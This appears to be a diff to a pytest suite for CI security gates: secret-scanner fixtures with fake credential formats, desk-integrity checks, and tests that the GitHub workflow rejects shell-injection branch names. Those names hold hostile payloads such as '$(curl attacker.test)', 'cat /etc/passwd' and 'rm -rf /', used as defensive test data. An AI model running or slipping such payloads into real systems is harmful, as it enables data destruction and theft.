@@ -13,6 +13,7 @@ A gate that has silently stopped working looks identical to a gate with nothing 
 from __future__ import annotations
 
 import json
+import os
 import subprocess
 import sys
 from pathlib import Path
@@ -274,20 +275,20 @@ class TestG3Secrets:
         return run_gate("check_secrets.py", "--root", str(tmp_path), "--files", name)
 
     @pytest.mark.parametrize("content,label", [
-        ('AWS_KEY = "AKIAIOSFODNN7EXAMPLE"',                       "AWS access key"),
-        ('token = "ghp_016C7f8a9B2c3D4e5F6g7H8i9J0k1L2m3N4o5"',    "GitHub token"),
-        ('SLACK = "xoxb-123456789012-1234567890123-abcdefghijkl"', "Slack token"),
-        ('key = "AIzaSyD-abcdefghijklmnopqrstuvwxyz1234567"',      "Google API key"),
-        ('DB = "postgresql://admin:hunter2@db.internal:5432/prod"', "connection string"),
-        ('-----BEGIN RSA PRIVATE KEY-----',                        "private key block"),
-        ('STRIPE = "sk_live_abcdefghijklmnopqrstuvwx"',            "Stripe live key"),
+        ('AWS_KEY = "AKIAIOSFODNN7EXAMPLE"',                       "AWS access key"),  # pragma: allowlist secret — gate fixture
+        ('token = "ghp_016C7f8a9B2c3D4e5F6g7H8i9J0k1L2m3N4o5"',    "GitHub token"),  # pragma: allowlist secret — gate fixture
+        ('SLACK = "xoxb-123456789012-1234567890123-abcdefghijkl"', "Slack token"),  # pragma: allowlist secret — gate fixture
+        ('key = "AIzaSyD-abcdefghijklmnopqrstuvwxyz1234567"',      "Google API key"),  # pragma: allowlist secret — gate fixture
+        ('DB = "postgresql://admin:hunter2@db.internal:5432/prod"', "connection string"),  # pragma: allowlist secret — gate fixture
+        ('-----BEGIN RSA PRIVATE KEY-----',                        "private key block"),  # pragma: allowlist secret — gate fixture
+        ('STRIPE = "sk_live_abcdefghijklmnopqrstuvwx"',            "Stripe live key"),  # pragma: allowlist secret — gate fixture
     ])
     def test_known_secret_formats_blocked(self, tmp_path, content, label):
         r = self._scan(tmp_path, content)
         assert r.returncode == 1, f"{label} should have been caught"
 
     def test_high_entropy_with_secret_name_blocked(self, tmp_path):
-        r = self._scan(tmp_path, 'api_secret = "8Kf3nQ9pL2mX7vB4tR6wY1zA5cD0eG8h"')
+        r = self._scan(tmp_path, 'api_secret = "8Kf3nQ9pL2mX7vB4tR6wY1zA5cD0eG8h"')  # pragma: allowlist secret — gate fixture
         assert r.returncode == 1
         assert "high_entropy" in r.stderr
 
@@ -312,7 +313,7 @@ class TestG3Secrets:
 
     def test_secret_is_redacted_in_output(self, tmp_path):
         """The scanner must not print the secret it found into CI logs."""
-        secret = "ghp_016C7f8a9B2c3D4e5F6g7H8i9J0k1L2m3N4o5"
+        secret = "ghp_016C7f8a9B2c3D4e5F6g7H8i9J0k1L2m3N4o5"  # pragma: allowlist secret — gate fixture
         r = self._scan(tmp_path, f'token = "{secret}"')
         assert r.returncode == 1
         assert secret not in r.stderr, "the gate leaked the secret into its own output"
@@ -530,6 +531,283 @@ class TestG5G6RollbackAndDestructive:
 
 
 # ===========================================================================
+# G-7 — desk integrity
+# ===========================================================================
+
+class TestG7DeskIntegrity:
+
+    ROSTERS = REPO_ROOT / "contracts" / "tool-rosters"
+    PACKS = REPO_ROOT / "contracts" / "tool-packs"
+
+    def _desk(self, tmp_path: Path) -> dict[str, Path]:
+        """A desk checkout in tmp: the real rosters and packs, empty prompt and template dirs.
+
+        Each test alters one file so the gate is exercised against the real contract shape
+        rather than a hand-written approximation of it.
+        """
+        import shutil
+        dirs = {
+            "rosters": tmp_path / "rosters",
+            "packs": tmp_path / "packs",
+            "prompts": tmp_path / "prompts",
+            "assembled": tmp_path / "assembled",
+            "templates": tmp_path / "templates",
+        }
+        shutil.copytree(self.ROSTERS, dirs["rosters"])
+        shutil.copytree(self.PACKS, dirs["packs"])
+        for key in ("prompts", "assembled", "templates"):
+            dirs[key].mkdir()
+        return dirs
+
+    def _run(self, tmp_path: Path, dirs: dict[str, Path]) -> subprocess.CompletedProcess:
+        return run_gate(
+            "check_desk_integrity.py", "--repo", str(tmp_path),
+            "--rosters-dir", str(dirs["rosters"]),
+            "--packs-dir", str(dirs["packs"]),
+            "--prompts-dir", str(dirs["prompts"]),
+            "--assembled-dir", str(dirs["assembled"]),
+            "--templates-dir", str(dirs["templates"]),
+        )
+
+    @staticmethod
+    def _edit_yaml(path: Path, mutate) -> None:
+        import yaml
+        doc = yaml.safe_load(path.read_text())
+        mutate(doc)
+        path.write_text(yaml.safe_dump(doc, sort_keys=False))
+
+    @staticmethod
+    def _clone_tool(tools: list, index: int, name: str) -> dict:
+        import copy
+        tool = copy.deepcopy(tools[index])
+        tool["name"] = name
+        return tool
+
+    # --- real contracts ---------------------------------------------------
+
+    def test_real_rosters_and_packs_pass(self, tmp_path):
+        """The committed contracts obey the rules the README states. Prompt and template
+        checks run against empty dirs here: the prompt sources are being moved to
+        placeholders separately, and that migration is not what this test measures."""
+        for name in ("prompts", "assembled", "templates"):
+            (tmp_path / name).mkdir()
+        r = run_gate(
+            "check_desk_integrity.py", "--repo", str(REPO_ROOT),
+            "--rosters-dir", str(self.ROSTERS), "--packs-dir", str(self.PACKS),
+            "--prompts-dir", str(tmp_path / "prompts"),
+            "--assembled-dir", str(tmp_path / "assembled"),
+            "--templates-dir", str(tmp_path / "templates"),
+        )
+        assert r.returncode == 0, r.stderr
+        assert "G-7 PASS" in r.stdout
+        assert "7 rosters, 3 packs" in r.stdout
+
+    def test_fixture_copy_passes(self, tmp_path):
+        """The unaltered fixture passes, so every failure below is caused by its one edit."""
+        dirs = self._desk(tmp_path)
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 0, r.stderr
+
+    # --- rosters ------------------------------------------------------------
+
+    def test_roster_with_nine_tools_blocked(self, tmp_path):
+        """Core 8 + 1 own = 9: below the floor."""
+        dirs = self._desk(tmp_path)
+        self._edit_yaml(dirs["rosters"] / "android.yaml",
+                        lambda d: d.update(tools=d["tools"][:1]))
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "android.yaml" in r.stderr
+        assert "9 effective tool(s)" in r.stderr
+
+    def test_roster_with_sixteen_tools_blocked(self, tmp_path):
+        """Core 8 + 8 own = 16: past the ceiling."""
+        dirs = self._desk(tmp_path)
+        self._edit_yaml(
+            dirs["rosters"] / "android.yaml",
+            lambda d: d["tools"].append(self._clone_tool(d["tools"], 0, "desk_play_extra")),
+        )
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "16 effective tool(s)" in r.stderr
+
+    def test_g5_tool_without_rollback_plan_blocked(self, tmp_path):
+        """A g5 tool whose schema does not require rollback_plan is a deployment G-5 never sees."""
+        dirs = self._desk(tmp_path)
+
+        def strip(doc):
+            tool = next(t for t in doc["tools"] if t["name"] == "desk_play_staged_rollout")
+            assert "g5" in tool["gates"]
+            tool["input"]["required"].remove("rollback_plan")
+
+        self._edit_yaml(dirs["rosters"] / "android.yaml", strip)
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "desk_play_staged_rollout" in r.stderr
+        assert "rollback_plan" in r.stderr
+
+    def test_g6_tool_without_approval_id_blocked(self, tmp_path):
+        dirs = self._desk(tmp_path)
+
+        def strip(doc):
+            tool = next(t for t in doc["tools"] if t["name"] == "desk_play_halt_rollout")
+            tool["input"]["required"].remove("approval_id")
+
+        self._edit_yaml(dirs["rosters"] / "android.yaml", strip)
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "approval_id" in r.stderr
+
+    def test_tool_without_input_schema_blocked(self, tmp_path):
+        dirs = self._desk(tmp_path)
+        self._edit_yaml(dirs["rosters"] / "web.yaml", lambda d: d["tools"][0].pop("input"))
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "no input schema" in r.stderr
+
+    def test_duplicate_tool_name_across_core_and_seat_blocked(self, tmp_path):
+        """A seat tool named like a core tool would shadow it on the endpoint."""
+        dirs = self._desk(tmp_path)
+        self._edit_yaml(dirs["rosters"] / "ios.yaml",
+                        lambda d: d["tools"][0].update(name="desk_brief"))
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "declared twice" in r.stderr
+
+    def test_endpoint_must_match_short_name(self, tmp_path):
+        dirs = self._desk(tmp_path)
+        self._edit_yaml(dirs["rosters"] / "infra.yaml", lambda d: d.update(endpoint="/mcp/ops"))
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "/mcp/infra" in r.stderr
+
+    # --- packs --------------------------------------------------------------
+
+    def test_pack_with_six_tools_blocked(self, tmp_path):
+        dirs = self._desk(tmp_path)
+        self._edit_yaml(
+            dirs["packs"] / "kanbanos.yaml",
+            lambda d: d["tools"].append(self._clone_tool(d["tools"], 0, "kanbanos_extra")),
+        )
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "kanbanos.yaml" in r.stderr
+        assert "6 tool(s)" in r.stderr
+
+    def test_pack_tool_without_app_prefix_blocked(self, tmp_path):
+        dirs = self._desk(tmp_path)
+        self._edit_yaml(dirs["packs"] / "clippyos.yaml",
+                        lambda d: d["tools"][0].update(name="desk_api_smoke"))
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "not prefixed 'clippyos_'" in r.stderr
+
+    # --- prompts ------------------------------------------------------------
+
+    UUID = "4d78b294-1c2e-4f5a-9b8c-0d1e2f3a4b5c"
+
+    def test_prompt_source_with_literal_uuid_blocked(self, tmp_path):
+        """A hardcoded channel id is a desk that cannot be installed for a second team."""
+        dirs = self._desk(tmp_path)
+        (dirs["prompts"] / "bot-03-android.xml").write_text(
+            f"<prompt><channel_id>{self.UUID}</channel_id></prompt>\n"
+        )
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "bot-03-android.xml" in r.stderr
+        assert "literal UUID" in r.stderr
+
+    def test_prompt_source_with_placeholder_passes(self, tmp_path):
+        dirs = self._desk(tmp_path)
+        (dirs["prompts"] / "_shared").mkdir()
+        (dirs["prompts"] / "_shared" / "core-directives.xml").write_text(
+            "<prompt><channel_id>{{DESK_CHANNEL_ID}}</channel_id>"
+            "<agent_uuid>{{SEAT_UUID:ANDROID}}</agent_uuid></prompt>\n"
+        )
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 0, r.stderr
+        assert "1 prompt files checked" in r.stdout
+
+    def test_assembled_prompt_with_unfilled_placeholder_blocked(self, tmp_path):
+        dirs = self._desk(tmp_path)
+        (dirs["assembled"] / "ANDROID.xml").write_text(
+            "<prompt><agent_uuid>{{SEAT_UUID:ANDROID}}</agent_uuid></prompt>\n"
+        )
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "ANDROID.xml" in r.stderr
+        assert "unfilled placeholder {{SEAT_UUID:ANDROID}}" in r.stderr
+
+    def test_assembled_alias_under_prompts_is_checked_as_output(self, tmp_path):
+        """prompts/ANDROID.xml is assembled output: a UUID is fine there, a placeholder is not."""
+        dirs = self._desk(tmp_path)
+        (dirs["prompts"] / "ANDROID.xml").write_text(
+            f"<prompt><agent_uuid>{self.UUID}</agent_uuid></prompt>\n"
+        )
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 0, r.stderr
+
+        (dirs["prompts"] / "ANDROID.xml").write_text("<prompt>{{DESK_CHANNEL_ID}}</prompt>\n")
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "unfilled placeholder" in r.stderr
+
+    def test_empty_assembled_prompt_blocked(self, tmp_path):
+        dirs = self._desk(tmp_path)
+        (dirs["assembled"] / "LEAD.xml").write_text("")
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert "empty" in r.stderr
+
+    # --- templates ----------------------------------------------------------
+
+    @pytest.mark.parametrize("content,label", [
+        ("token: ghp_0123456789abcdefghij",                     "GitHub token shape"),  # pragma: allowlist secret — gate fixture
+        ("gateway: http://desk-gateway.railway.internal:8080", "railway.internal"),
+        ("key: sk-abcdefghijklmnopqrstuvwxyz",                  "API key shape"),  # pragma: allowlist secret — gate fixture
+        ("slack: xoxb-000",                                     "Slack token shape"),
+        ("aws: AKIAIOSFODNN7EXAMPLE",                           "AWS access key shape"),  # pragma: allowlist secret — gate fixture
+        ("-----BEGIN OPENSSH PRIVATE KEY-----",                 "key block"),  # pragma: allowlist secret — gate fixture
+        ("host: tailscale-forwarder",                           "tailnet name"),
+        ("url: https://vps.tail1234.ts.net/mcp/lead",           "tailnet domain"),
+        ("ip: 100.101.102.103",                                 "tailnet address"),
+        ("agent: 4d78b294-1c2e-4f5a-9b8c-0d1e2f3a4b5c",         "literal UUID"),
+    ])
+    def test_template_with_forbidden_content_blocked(self, tmp_path, content, label):
+        """Templates are published to every recipient team: nothing in them may point at the
+        desk's own infrastructure or credentials."""
+        dirs = self._desk(tmp_path)
+        (dirs["templates"] / "android.md").write_text(f"# ANDROID\n\n{content}\n")
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1, f"{label} should have been caught"
+        assert "android.md" in r.stderr
+
+    def test_template_gate_does_not_leak_the_token(self, tmp_path):
+        token = "ghp_0123456789abcdefghij"  # pragma: allowlist secret — gate fixture
+        dirs = self._desk(tmp_path)
+        (dirs["templates"] / "lead.md").write_text(f"token: {token}\n")
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 1
+        assert token not in r.stderr, "the gate leaked the token into its own output"
+
+    def test_clean_template_passes(self, tmp_path):
+        dirs = self._desk(tmp_path)
+        (dirs["templates"] / "lead.md").write_text(
+            "# LEAD\n\nProgramming lead for the desk. Connect to {{DESK_GATEWAY_URL}}/mcp/lead.\n"
+        )
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 0, r.stderr
+
+    def test_missing_templates_dir_is_skipped_not_failed(self, tmp_path):
+        """The templates are generated later in the rollout; their absence is not a defect."""
+        dirs = self._desk(tmp_path)
+        dirs["templates"].rmdir()
+        r = self._run(tmp_path, dirs)
+        assert r.returncode == 0, r.stderr
+        assert "template check skipped" in r.stdout
+
+
+# ===========================================================================
 # Receipt directory ownership
 #
 # Found by end-to-end testing: every bot writes receipts, so a single shared
@@ -591,3 +869,306 @@ class TestReceiptDirectoryOwnership:
         assert r.returncode == 1
         assert "FOREIGN" in r.stderr
         assert "bot-01-systems-backend" in r.stderr
+
+
+# ===========================================================================
+# The gate workflows themselves — shell injection
+# ===========================================================================
+
+WORKFLOWS = [
+    ".github/workflows/gates.yml",      # the copy that runs here
+    "ci/.github/workflows/gates.yml",   # the copy other repositories take
+]
+
+
+class TestEveryGateIsWired:
+    """A gate no step runs is not a gate.
+
+    The template-sync check cannot catch a gate being dropped, because it compares the two
+    workflow copies to each other: delete a step from both and it stays green. That is not
+    hypothetical — a commit whose subject was only about switching to a self-hosted runner
+    removed the G-7 step from both files, and sync passed.
+
+    Keyed on the *invocation* rather than the step name, so renaming or reordering a step is
+    free while removing the check it performs is not. One script can carry more than one
+    gate — check_ownership.py runs the manifest self-check and the path-ownership check as
+    separate steps — so a per-filename test would stay green after either was deleted, the
+    other's mention being enough to satisfy it.
+    """
+
+    # (label, script, a flag that distinguishes this invocation from others of the same script)
+    REQUIRED = [
+        ("G-1 manifest self-check", "check_ownership.py", "--validate-manifest"),
+        ("G-1 path ownership", "check_ownership.py", "--bot"),
+        ("G-2 verification receipt", "check_receipt.py", None),
+        ("G-3 committed secrets", "check_secrets.py", None),
+        ("G-4 contract-first changes", "check_contracts.py", None),
+        ("G-5/G-6 rollback and destructive ops", "check_rollback.py", None),
+        ("G-7 desk integrity", "check_desk_integrity.py", None),
+    ]
+
+    @staticmethod
+    def _run_bodies(workflow: str) -> list[str]:
+        yaml = pytest.importorskip("yaml")
+        doc = yaml.safe_load((REPO_ROOT / workflow).read_text())
+        return [
+            step["run"]
+            for job in doc["jobs"].values()
+            for step in (job.get("steps") or [])
+            if step.get("run")
+        ]
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_every_required_gate_check_has_a_step(self, workflow):
+        bodies = self._run_bodies(workflow)
+        missing = [
+            label for label, script, flag in self.REQUIRED
+            if not any(script in b and (flag is None or flag in b) for b in bodies)
+        ]
+        assert not missing, (
+            f"{workflow} has no step running: {'; '.join(missing)}. "
+            "Each is a required check — one the workflow never runs blocks nothing, and "
+            "template sync will not notice, because it only compares the two copies to each "
+            "other. Restore the step, or drop the gate deliberately and update this list."
+        )
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_no_gate_script_is_left_unwired(self, workflow):
+        """Catches a *new* gate script that was added without being wired into the workflow."""
+        scripts = {p.name for p in GATES.glob("check_*.py")}
+        assert scripts, "no gate scripts found — this test is not looking where it thinks"
+
+        bodies = self._run_bodies(workflow)
+        unwired = sorted(s for s in scripts if not any(s in b for b in bodies))
+        assert not unwired, (
+            f"{workflow} never runs: {', '.join(unwired)}. A gate script in ci/gates/ that no "
+            "step invokes enforces nothing. Wire it up, add it to REQUIRED above, or delete it."
+        )
+
+
+class TestReceiptSelection:
+    """G-2 must read the receipt for THIS change, not one replayed alongside it.
+
+    A rebase or a stack landing adds several of a seat's receipts at once, all of them
+    "added" relative to the base. Selecting by sort order then validates the change against
+    a receipt describing different work — failing closed when that receipt has no
+    approved_by, and passing on it when it has one. That second case is the same fail-open
+    G-4's change-document selector was fixed for; this is the sibling selector.
+
+    Runs the shipped step rather than a copy of it, for the reason the injection tests do.
+    """
+
+    @staticmethod
+    def _select(workflow: str, tmp_path: Path, receipts: dict[str, dict | None],
+                head_ref: str) -> subprocess.CompletedProcess:
+        """Run the shipped selection step against a fixture set of receipts.
+
+        `receipts` maps filename to its JSON content, or None to write invalid JSON. The
+        step's `git diff` is stubbed by pre-writing receipts.txt, which is what it consumes.
+        """
+        yaml = pytest.importorskip("yaml")
+        doc = yaml.safe_load((REPO_ROOT / workflow).read_text())
+        body = next(
+            s["run"] for job in doc["jobs"].values() for s in (job.get("steps") or [])
+            if s.get("id") == "receipt" and s.get("run")
+        )
+        # Drop the `git diff ... > receipts.txt` line: the fixture supplies that file.
+        kept = [ln for ln in body.splitlines(keepends=True)
+                if "git diff" not in ln and not ln.strip().startswith(('"origin/$BASE_REF', "| grep -E"))]
+
+        bot_dir = tmp_path / ".receipts" / "bot-00-programming-lead"
+        bot_dir.mkdir(parents=True)
+        listing = []
+        for name, content in receipts.items():
+            f = bot_dir / name
+            f.write_text("not json" if content is None else json.dumps(content))
+            listing.append(str(f.relative_to(tmp_path)))
+        (tmp_path / "receipts.txt").write_text("\n".join(listing) + "\n")
+
+        script = tmp_path / "select.sh"
+        script.write_text("".join(kept))
+        return subprocess.run(
+            ["bash", "-e", str(script)],
+            capture_output=True, text=True, cwd=tmp_path,
+            env={"BOT": "bot-00-programming-lead", "BASE_REF": "main",
+                 "HEAD_REF": head_ref, "GITHUB_OUTPUT": str(tmp_path / "out"),
+                 "PATH": os.environ["PATH"]},
+        )
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_single_receipt_is_used_as_is(self, workflow, tmp_path):
+        """The common case must keep working, including when it names no branch."""
+        r = self._select(workflow, tmp_path, {"only.json": {"task_id": "x"}}, "any/branch")
+        assert r.returncode == 0, r.stdout + r.stderr
+        assert "only.json" in (tmp_path / "out").read_text()
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_replayed_receipt_does_not_win_on_sort_order(self, workflow, tmp_path):
+        """The real case: 'grokbot' sorts before 'stack', and only the latter is this change."""
+        r = self._select(workflow, tmp_path, {
+            "desk-v2-grokbot-share.json": {"task_id": "replayed"},
+            "desk-v2-stack-land-on-main.json": {"task_id": "this", "branch": "bot-00/land"},
+        }, "bot-00/land")
+        assert r.returncode == 0, r.stdout + r.stderr
+        selected = (tmp_path / "out").read_text()
+        assert "desk-v2-stack-land-on-main.json" in selected
+        assert "grokbot" not in selected
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_ambiguous_receipts_stop_the_build(self, workflow, tmp_path):
+        """Two receipts and none naming this branch is not a guess the gate may make."""
+        r = self._select(workflow, tmp_path, {
+            "a.json": {"task_id": "a"}, "b.json": {"task_id": "b"},
+        }, "bot-00/land")
+        assert r.returncode != 0
+        assert "2 receipts" in r.stdout + r.stderr
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_no_receipt_still_fails(self, workflow, tmp_path):
+        r = self._select(workflow, tmp_path, {}, "bot-00/land")
+        assert r.returncode != 0
+        assert "no verification receipt" in r.stdout + r.stderr
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_unreadable_receipt_does_not_crash_the_selection(self, workflow, tmp_path):
+        """A malformed receipt must not take the gate down; it just cannot be the match."""
+        r = self._select(workflow, tmp_path, {
+            "broken.json": None,
+            "good.json": {"task_id": "this", "branch": "bot-00/land"},
+        }, "bot-00/land")
+        assert r.returncode == 0, r.stdout + r.stderr
+        assert "good.json" in (tmp_path / "out").read_text()
+
+
+class TestWorkflowShellInjection:
+    """A gate that runs attacker-controlled text as shell is worse than no gate.
+
+    Branch names are attacker-controlled on a fork pull request, so anything derived from
+    one — and the receipt path derived from that in turn — reaches these workflows as
+    untrusted input. The rule both files follow: untrusted values enter a step through
+    `env:` and are read as quoted shell variables. A `${{ }}` expansion inside a `run:`
+    body is different in kind, because Actions substitutes it into the script *before*
+    bash parses it, so the value becomes source code rather than data.
+
+    These tests exist because that protection was silently reverted once: a branch
+    carried an older copy of the workflow forward over the hardened one, and nothing
+    caught it — the two files still agreed with each other, so the template-sync check
+    passed. Reviewing a workflow diff for this by eye does not scale.
+    """
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_no_github_expression_inside_a_run_body(self, workflow):
+        """The P1 condition itself, asserted structurally rather than by grepping text."""
+        yaml = pytest.importorskip("yaml")
+        doc = yaml.safe_load((REPO_ROOT / workflow).read_text())
+
+        offenders = []
+        for job_name, job in doc["jobs"].items():
+            for i, step in enumerate(job.get("steps") or []):
+                body = step.get("run")
+                if body and "${{" in body:
+                    name = step.get("name", f"steps[{i}]")
+                    offenders.append(f"{job_name} / {name}")
+
+        assert not offenders, (
+            f"{workflow} interpolates a GitHub expression into a shell body: "
+            + "; ".join(offenders)
+            + ". Pass the value through an env: block and read it as \"$VAR\" instead — "
+            "Actions substitutes ${{ }} before bash parses the script, so the value "
+            "becomes code."
+        )
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    def test_acting_bot_pattern_is_anchored_at_both_ends(self, workflow):
+        """Secondary to the behavioural tests below, which run the shipped step itself.
+
+        Kept because it names the cause directly: when the behavioural tests go red this
+        says whether the pattern was the thing that changed.
+        """
+        text = (REPO_ROOT / workflow).read_text()
+        assert "^bot-0[0-6]-[a-z0-9-]+$" in text, (
+            f"{workflow} does not validate the acting bot against an anchored pattern. "
+            "A prefix-only match such as ^bot-0[0-6]- accepts a branch named "
+            "bot-01-$(id)/x, and the bot id is then used to build paths in later steps."
+        )
+
+    INJECTION_BRANCHES = [
+        "bot-01-$(id)/x",
+        "bot-01-`whoami`/x",
+        "bot-01-a;cat /etc/passwd/x",
+        "bot-01-a$(curl attacker.test)/x",
+        'bot-01-a"; rm -rf /; #/x',
+        "bot-07-nope/x",          # no such seat
+        "claude/desk-v2-stack/x",  # no bot prefix at all
+    ]
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    @pytest.mark.parametrize("branch", INJECTION_BRANCHES)
+    def test_injection_payload_in_a_branch_name_is_rejected(self, workflow, branch, tmp_path):
+        """Runs the shipped step, not a copy of it, and requires a refusal."""
+        code, bot = self._resolve_acting_bot(workflow, branch, tmp_path)
+        assert code != 0, f"branch {branch!r} was accepted; resolved to {bot!r}"
+        assert bot is None, f"branch {branch!r} still produced an output bot: {bot!r}"
+
+    @pytest.mark.parametrize("workflow", WORKFLOWS)
+    @pytest.mark.parametrize("branch,expected", [
+        ("bot-00-programming-lead/desk-model", "bot-00-programming-lead"),
+        ("bot-03-android/feat-push-notifications", "bot-03-android"),
+        ("bot-06-quality-security/desk-v2-assembled-prompts", "bot-06-quality-security"),
+    ])
+    def test_legitimate_branch_still_resolves(self, workflow, branch, expected, tmp_path):
+        """The refusals above are worthless if the step also rejects real branches."""
+        code, bot = self._resolve_acting_bot(workflow, branch, tmp_path)
+        assert code == 0, f"{branch!r} was refused by {workflow}"
+        assert bot == expected
+
+    @staticmethod
+    def _acting_bot_script(workflow: str) -> str:
+        """The `run:` body of the shipped 'Determine the acting bot' step.
+
+        Extracted rather than transcribed: a copy of the logic here would keep passing
+        while the workflow's own parsing or validation changed underneath it, which is the
+        one thing these tests exist to prevent.
+        """
+        yaml = pytest.importorskip("yaml")
+        doc = yaml.safe_load((REPO_ROOT / workflow).read_text())
+        for job in doc["jobs"].values():
+            for step in job.get("steps") or []:
+                if step.get("id") == "bot" and step.get("run"):
+                    return step["run"]
+        raise AssertionError(
+            f"{workflow} has no step with id 'bot' that runs a script — the acting-bot "
+            "resolution these tests cover has moved or been renamed, so they are no "
+            "longer testing it."
+        )
+
+    @classmethod
+    def _resolve_acting_bot(cls, workflow: str, branch: str,
+                            tmp_path: Path) -> tuple[int, str | None]:
+        """Run the shipped step against one branch. Returns (exit code, resolved bot).
+
+        Mirrors how Actions invokes it: `bash -e <file>` — the default shell on Linux
+        runners — with the branch in the environment and a real $GITHUB_OUTPUT to append
+        to. The bot is read back from that file rather than from stdout, because the step
+        publishes it there for later steps to consume.
+        """
+        script = tmp_path / "acting-bot.sh"
+        script.write_text(cls._acting_bot_script(workflow))
+        output = tmp_path / "github_output"
+        output.touch()
+
+        r = subprocess.run(
+            ["bash", "-e", str(script)],
+            capture_output=True, text=True,
+            env={
+                "GITHUB_HEAD_REF": branch,
+                "GITHUB_REF": "",
+                "GITHUB_OUTPUT": str(output),
+                "PATH": "/usr/bin:/bin",
+            },
+        )
+        bot = None
+        for line in output.read_text().splitlines():
+            if line.startswith("bot="):
+                bot = line[len("bot="):]
+        return r.returncode, bot
